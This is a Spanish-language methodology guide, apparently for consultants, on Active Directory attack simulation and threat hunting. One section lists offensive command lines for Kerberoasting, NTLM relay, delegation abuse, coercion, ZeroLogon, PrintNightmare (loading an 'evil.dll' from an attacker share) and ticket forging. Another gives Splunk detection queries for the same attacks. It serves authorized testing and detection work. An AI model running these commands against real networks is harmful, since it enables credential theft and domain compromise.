# üè¢ Gu√≠a de Implementaci√≥n por Escenarios de Cliente

---

## üéØ Objetivo

Esta gu√≠a proporciona metodolog√≠as espec√≠ficas para implementar los service packages seg√∫n el nivel de acceso y recursos proporcionados por el cliente.

---

## üñ•Ô∏è Escenario A: Cliente con M√°quina Dedicada

### üìã Caracter√≠sticas del Escenario
- ‚úÖ M√°quina virtual o f√≠sica proporcionada
- ‚úÖ Acceso administrativo al entorno de testing
- ‚úÖ Conectividad controlada al dominio
- ‚úÖ Posibilidad de instalaci√≥n de herramientas

### üéØ Ventajas Operacionales
- **Efectividad M√°xima**: Ejecuci√≥n real de todas las t√©cnicas
- **Evidencias Concretas**: Demostraciones visuales del impacto
- **Validaci√≥n Completa**: Verificaci√≥n end-to-end de controles
- **Automatizaci√≥n**: Posibilidad de scripts y herramientas avanzadas

### üîß Metodolog√≠a de Implementaci√≥n

#### Fase 1: Preparaci√≥n del Entorno (D√≠a 1-2)
```bash
# Setup inicial de herramientas
# Ejemplo de setup automatizado para m√°quina de testing

# 1. Instalaci√≥n de dependencias
sudo apt update && sudo apt install -y python3-pip git crackmapexec

# 2. Clone de herramientas principales
git clone https://github.com/SecureAuthCorp/impacket.git
git clone https://github.com/GhostPack/Rubeus.git
git clone https://github.com/BloodHoundAD/BloodHound.git

# 3. Setup de Impacket
cd impacket && pip3 install .

# 4. Verificaci√≥n de conectividad
ping <domain-controller-ip>
nmap -p 88,135,139,389,445,464,636 <domain-controller-ip>
```

#### Fase 2: Ejecuci√≥n por Pack

##### üî∞ Pack 1 - Implementaci√≥n Completa
```bash
# D√≠a 1-3: Reconocimiento y Enumeraci√≥n
echo "=== PACK 1 - D√çA 1: RECONOCIMIENTO ==="

# Enumeraci√≥n SMB
enum4linux -a <target-ip>
smbclient -L //<target-ip> -N
crackmapexec smb <target-ip> --shares

# Enumeraci√≥n LDAP  
ldapsearch -x -h <target-ip> -s base namingcontexts
python3 windapsearch.py -d <domain> --dc-ip <target-ip> -U

# Enumeraci√≥n RPC
rpcclient -U "" -N <target-ip>
# > enumdomusers
# > enumdomgroups

# D√≠a 4-7: Ataques de Credenciales
echo "=== PACK 1 - D√çA 4: ATAQUES CREDENCIALES ==="

# AS-REP Roasting
python3 GetNPUsers.py <domain>/ -no-pass -dc-ip <target-ip>

# Kerberoasting
python3 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <target-ip> -request

# BruteForce Kerberos
kerbrute userenum --dc <target-ip> -d <domain> users.txt

# D√≠a 8-14: Relay Attacks
echo "=== PACK 1 - D√çA 8: RELAY ATTACKS ==="

# SMB Relay b√°sico
python3 ntlmrelayx.py -tf targets.txt -smb2support

# Responder + Relay
sudo responder -I eth0 -dwP
python3 ntlmrelayx.py -tf targets.txt -smb2support -6
```

##### ‚ö° Pack 2 - T√©cnicas Avanzadas
```bash
# Semana 3-4: Kerberos Avanzado
echo "=== PACK 2 - SEMANA 3: KERBEROS AVANZADO ==="

# Unconstrained Delegation
python3 findDelegation.py <domain>/<user>:<pass>
# Si se encuentra delegaci√≥n:
python3 getST.py -spn <target-spn> -impersonate <admin-user> <domain>/<delegated-user>

# RBCD Abuse
python3 rbcd.py <domain>/<user>:<pass> -delegate-to <target>$ -delegate-from <controlled-machine>$

# S4U2Self/S4U2Proxy
python3 getST.py -spn <service-spn> -impersonate <target-user> <domain>/<service-account>

# Semana 5-6: Coerci√≥n y CVEs
echo "=== PACK 2 - SEMANA 5: COERCI√ìN Y CVES ==="

# Coerci√≥n de autenticaci√≥n
python3 printerbug.py <domain>/<user>:<pass>@<target> <attacker-ip>
python3 PetitPotam.py <attacker-ip> <target-ip>

# ZeroLogon
python3 zerologon_tester.py <dc-name> <dc-ip>

# PrintNightmare
python3 CVE-2021-1675.py <domain>/<user>:<pass>@<target> '\\<attacker>\share\evil.dll'
```

##### üéØ Pack 3 - T√©cnicas Expertas
```bash
# Semana 7-10: Persistencia y Tickets
echo "=== PACK 3 - SEMANA 7: PERSISTENCIA ==="

# Golden Ticket (requiere KRBTGT hash)
python3 ticketer.py -nthash <krbtgt-hash> -domain-sid <domain-sid> -domain <domain> Administrator

# Silver Ticket
python3 ticketer.py -nthash <service-hash> -spn <service-spn> -domain-sid <domain-sid> -domain <domain> Administrator

# DCShadow (requiere privilegios elevados)
# Implementaci√≥n con mimikatz en entorno controlado

# Semana 11-12: Mainframes (si aplica)
echo "=== PACK 3 - SEMANA 11: MAINFRAMES ==="

# z/OS Enumeration
nmap -p 23,992 --script=tn3270-screen <mainframe-ip>
python3 z_enum.py <mainframe-ip>

# TSO/ISPF Access
telnet <mainframe-ip> 23
# Manual testing seg√∫n documentaci√≥n mainframe
```

#### Fase 3: Validaci√≥n y Documentaci√≥n
```bash
# Verificaci√≥n de detecci√≥n en SIEM
echo "=== VALIDACI√ìN DE DETECCI√ìN ==="

# Revisi√≥n de logs generados
# Correlaci√≥n con eventos en SIEM/XDR
# Documentaci√≥n de t√©cnicas no detectadas
# Generaci√≥n de evidencias y recomendaciones
```

### üìä Entregables Escenario A
1. **Evidencias de Ejecuci√≥n**: Screenshots, logs, videos
2. **Matriz de Detecci√≥n**: Qu√© t√©cnicas fueron detectadas
3. **An√°lisis de Impacto**: Simulaci√≥n de da√±os por t√©cnica
4. **Hardening Roadmap**: Priorizaci√≥n de mitigaciones

---

## üìä Escenario B: Solo Acceso SIEM/XDR

### üìã Caracter√≠sticas del Escenario
- ‚ö†Ô∏è Sin posibilidad de ejecuci√≥n directa
- ‚úÖ Acceso a herramientas de monitoreo
- ‚úÖ Acceso a logs hist√≥ricos
- ‚úÖ Capacidad de crear reglas y alertas

### üéØ Ventajas del Hunting Activo
- **An√°lisis Forense**: Identificaci√≥n de ataques pasados
- **Tuning de Reglas**: Optimizaci√≥n de detecciones
- **Gap Analysis**: Identificaci√≥n de puntos ciegos
- **Threat Intelligence**: Correlaci√≥n con IOCs

### üîç Metodolog√≠a de Hunting

#### Fase 1: Configuraci√≥n de Hunting (D√≠a 1-2)
```splunk
# Configuraci√≥n inicial de b√∫squedas base
# Ejemplo para Splunk

# B√∫squeda base de eventos de AD
index=windows sourcetype="WinEventLog:Security" 
| eval EventDescription=case(
    EventCode=4624, "Successful Logon",
    EventCode=4625, "Failed Logon", 
    EventCode=4768, "Kerberos TGT Request",
    EventCode=4769, "Kerberos Service Ticket"
)

# Dashboard de baseline para eventos normales
index=windows EventCode IN (4624,4625,4768,4769) earliest=-7d
| stats count by EventCode, Computer, Account_Name
| sort -count
```

#### Fase 2: Hunting por Pack

##### üî∞ Pack 1 - Hunting B√°sico
```splunk
# === PACK 1 HUNTING QUERIES ===

# 1. Detecci√≥n AS-REP Roasting
index=windows EventCode=4768 Ticket_Options=0x40810000
| stats count by Account_Name, Client_Address 
| where count > 10

# 2. Detecci√≥n Kerberoasting  
index=windows EventCode=4769 Service_Name!="*$" Ticket_Encryption_Type=0x17
| stats count by Account_Name, Service_Name
| where count > 5

# 3. Detecci√≥n SMB Enumeration
index=windows EventCode=5140 Share_Name!="IPC$"
| stats dc(Share_Name) as unique_shares by Computer, Account_Name
| where unique_shares > 10

# 4. Detecci√≥n BruteForce
index=windows EventCode=4625 
| bucket _time span=5m
| stats count by _time, Account_Name, Computer
| where count > 5

# 5. Detecci√≥n Anonymous Logon
index=windows EventCode=4624 Logon_Type=3 Account_Name="ANONYMOUS LOGON"
| stats count by Computer, Source_Network_Address
```

##### ‚ö° Pack 2 - Hunting Avanzado
```splunk
# === PACK 2 HUNTING QUERIES ===

# 1. Detecci√≥n Unconstrained Delegation Abuse
index=windows EventCode=4769 Ticket_Options=0x40810000 Service_Name="*$"
| join Account_Name [search index=windows EventCode=4624 Logon_Type=3]
| stats count by Account_Name, Service_Name, Computer

# 2. Detecci√≥n RBCD Abuse
index=windows EventCode=5136 Object_Class="computer" Attribute_LDAP_Display_Name="msDS-AllowedToActOnBehalfOfOtherIdentity"
| table _time, Object_DN, Subject_User_Name, Attribute_Value

# 3. Detecci√≥n Coerci√≥n (PrinterBug/PetitPotam)
index=windows EventCode=4624 Logon_Type=3 Process_Name="*spoolsv.exe*"
| stats count by Computer, Account_Name, Source_Network_Address
| where count < 5 AND Source_Network_Address!="127.0.0.1"

# 4. Detecci√≥n ZeroLogon
index=windows EventCode=4742 Account_Name="*$" 
| where like(Attribute_Value, "%0000000000000000%")
| table _time, Computer, Account_Name, Subject_User_Name

# 5. Detecci√≥n PrintNightmare
index=windows source="WinEventLog:Microsoft-Windows-PrintService/Operational" EventCode IN (316,319,808)
| where like(Driver_Name, "*\\\\*") OR like(Driver_Path, "*\\\\*")
| table _time, Computer, Driver_Name, Driver_Path, User
```

##### üéØ Pack 3 - Hunting Experto
```splunk
# === PACK 3 HUNTING QUERIES ===

# 1. Detecci√≥n Golden Ticket
index=windows EventCode=4624 Logon_Type=3 
| join Account_Name [search index=windows EventCode=4768 | where Ticket_Lifetime > 600000]
| where Authentication_Package="Kerberos" AND Account_Domain!="NT AUTHORITY"
| table _time, Account_Name, Computer, Ticket_Lifetime

# 2. Detecci√≥n DCShadow  
index=windows EventCode=4742 Object_Class="server" Attribute_LDAP_Display_Name="servicePrincipalName"
| regex Attribute_Value="^GC/"
| table _time, Object_DN, Subject_User_Name, Attribute_Value

# 3. Detecci√≥n Silver Ticket
index=windows EventCode=4624 Logon_Type=3
| join Account_Name [search index=windows EventCode=4769 | where Ticket_Encryption_Type!=0x12]  
| where Authentication_Package="Kerberos"
| table _time, Account_Name, Service_Name, Computer

# 4. Detecci√≥n ADCS ESC Attacks
index=windows source="WinEventLog:Microsoft-Windows-CertificateServicesClient-Lifecycle-System/Operational" 
EventCode=1006
| table _time, Computer, Template_Name, Subject_Name

# 5. Detecci√≥n Lateral Movement Avanzado
index=windows EventCode=4624 Logon_Type IN (3,9,10)
| transaction Account_Name maxspan=1h
| where dc(Computer) > 3
| table Account_Name, Computer, eventcount
```

#### Fase 3: Gap Analysis y Recomendaciones
```splunk
# === AN√ÅLISIS DE GAPS ===

# T√©cnicas sin eventos correlacionados
# Generar reporte de t√©cnicas Pack X sin evidencia en logs
# Priorizar por criticidad e impacto potencial

# Ejemplo de reporte de gaps
| inputlookup pack1_techniques.csv
| join technique [search index=windows earliest=-30d | stats count by technique]
| where isnull(count)
| table technique, criticality, impact, hardening_required
```

### üìä Entregables Escenario B
1. **Hunting Report**: T√©cnicas identificadas en logs hist√≥ricos
2. **Gap Analysis**: T√©cnicas sin visibilidad en SIEM
3. **Detection Rules**: Nuevas reglas optimizadas
4. **Hardening Plan**: Recomendaciones por gaps identificados

---

## üîÑ Metodolog√≠a H√≠brida: SIEM + Laboratorio Limitado

### üìã Escenario Combinado
Algunos clientes pueden proporcionar acceso limitado a m√°quinas de testing junto con herramientas de monitoreo.

### üéØ Estrategia H√≠brida
1. **Hunting Primero**: Identificar qu√© t√©cnicas han ocurrido
2. **Testing Selectivo**: Ejecutar solo t√©cnicas no detectadas
3. **Validaci√≥n Cruzada**: Correlacionar ejecuci√≥n con detecci√≥n
4. **Optimizaci√≥n**: Tuning de reglas basado en tests reales

### üîß Flujo de Trabajo
```mermaid
graph TD
    A[SIEM Hunting] --> B{¬øT√©cnica Detectada?}
    B -->|S√≠| C[Validar Regla]
    B -->|No| D[Testing en Lab]
    D --> E[¬øDetectada Ahora?]
    E -->|S√≠| F[Tuning Regla]
    E -->|No| G[Hardening Required]
    C --> H[Siguiente T√©cnica]
    F --> H
    G --> H
```

---

## üìä Matriz de Decisi√≥n por Escenario

| Criterio | Escenario A | Escenario B | H√≠brido |
|----------|-------------|-------------|---------|
| **Costo** | üî¥ Alto | üü¢ Bajo | üü° Medio |
| **Efectividad** | üü¢ Muy Alta | üü° Media | üü¢ Alta |
| **Riesgo** | üü° Controlado | üü¢ M√≠nimo | üü° Bajo |
| **Evidencias** | üü¢ Completas | üü° Limitadas | üü¢ Buenas |
| **Hardening** | üü¢ Espec√≠fico | üü° Gen√©rico | üü¢ Optimizado |

---

## üõ†Ô∏è Herramientas por Escenario

### Escenario A (M√°quina Dedicada)
```bash
# Toolkit completo de pentesting
# Impacket, Rubeus, BloodHound, CrackMapExec
# PowerView, Mimikatz, herramientas espec√≠ficas
# Scripts de automatizaci√≥n personalizados
```

### Escenario B (Solo SIEM)
```splunk
# Queries de hunting personalizadas
# Dashboards de monitoreo
# Reglas de detecci√≥n Sigma
# Scripts de an√°lisis de logs
```

### Escenario H√≠brido
```bash
# Combinaci√≥n selectiva basada en findings
# Herramientas de testing espec√≠ficas para gaps
# Correlaci√≥n automatizada SIEM-Testing
# Validaci√≥n cruzada de detecciones
```

---

## üìö Templates de Documentaci√≥n

### Template Ejecutivo por Escenario
- **Escenario A**: Enfoque en demostraciones y evidencias visuales
- **Escenario B**: Enfoque en an√°lisis forense y gaps de detecci√≥n  
- **H√≠brido**: Balance entre evidencias y optimizaci√≥n

### M√©tricas de √âxito
```
Escenario A:
- % T√©cnicas ejecutadas exitosamente
- % T√©cnicas detectadas por SIEM
- Tiempo promedio de detecci√≥n
- N√∫mero de falsos positivos

Escenario B:  
- % T√©cnicas identificadas en logs hist√≥ricos
- N√∫mero de gaps cr√≠ticos identificados
- N√∫mero de reglas optimizadas
- Reducci√≥n de falsos positivos
```

---

*Actualizado: Agosto 2024*  
*Autor: [MinoTauro2020](https://github.com/MinoTauro2020)*